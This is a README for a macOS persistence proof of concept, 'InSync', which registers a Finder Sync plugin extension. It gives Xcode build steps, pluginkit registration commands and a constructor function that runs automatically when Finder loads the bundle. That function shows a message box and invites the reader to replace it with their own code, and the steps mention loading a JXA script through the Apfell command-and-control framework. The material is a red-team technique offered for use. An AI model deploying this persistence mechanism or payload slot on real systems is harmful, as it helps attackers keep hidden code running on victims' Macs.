# InSync
Finder Plugin Persistence. Attached is a PoC with a simple message box execution

# Resource
https://objective-see.com/blog/blog_0x11.html

## Steps to execute the attached Finder Plugin Extension (InSync)
1. Open the ```InSync.xcodeproj``` file in XCode
2. Change the code on line 17 of the methods file ```FinderSync.m``` with own Objective C code
3. In XCode Project-> Build
4. Place the app on target
5. Register Finder Extenstion Plugin
* Manually below of use the jxa script (FinderSyncPlugins.js)
    1. pluginkit -a /some/path/persist.appex
        1. pluginkit -a InSync.app/Contents/PlugIns/FinderSync.appex
    2. pluginkit -e use -i <finder sync's bundle id>
        1. pluginkit -e use -i com.apple.InSync.FinderSync
* Jxa script (FinderSyncPlugins.js) in Apfell
  1. jsimport {/path/to/FinderSyncPlugins.js}
  2. jsimport_call FinderSyncPlugins('/path/to/InSync.app')


## Instructions on how the attached Finder Plugin Extension was built
1. Xcode →New Project→Application
2. Change the Bundle Name
3. Select main project and select add target (+) on bottom
4. Add the Finder Sync Extension
5. Add the Project Name (take note of the Bundle Identifier)
6. Go to FinderSync folder and select the method file (.m)
7. Add the following on line 17
    1. Added the following for a PoC of loading the plugin (stolen from xorrior) or replace with own Objective-C code

  ```
    //automatically invoked when bundle is loaded
    __attribute__((constructor)) static void byebyebye()
    {
    // Just a message box payload
    NSAlert *alert = [[NSAlert alloc] init];
    [alert setMessageText:@"Install complete"];
    [alert addButtonWithTitle:@"OK"];
    [alert setAlertStyle:NSAlertStyleInformational];
    [alert runModal];
    }
  ```

8. Product → Build
9. Register the plugin Manually below of use the jxa script (FinderSyncPlugins.js)
    1. pluginkit -a /some/path/persist.appex
        1. pluginkit -a InSync.app/Contents/PlugIns/FinderSync.appex
    2. pluginkit -e use -i <finder sync's bundle id>
        1. pluginkit -e use -i com.apple.InSync.FinderSync
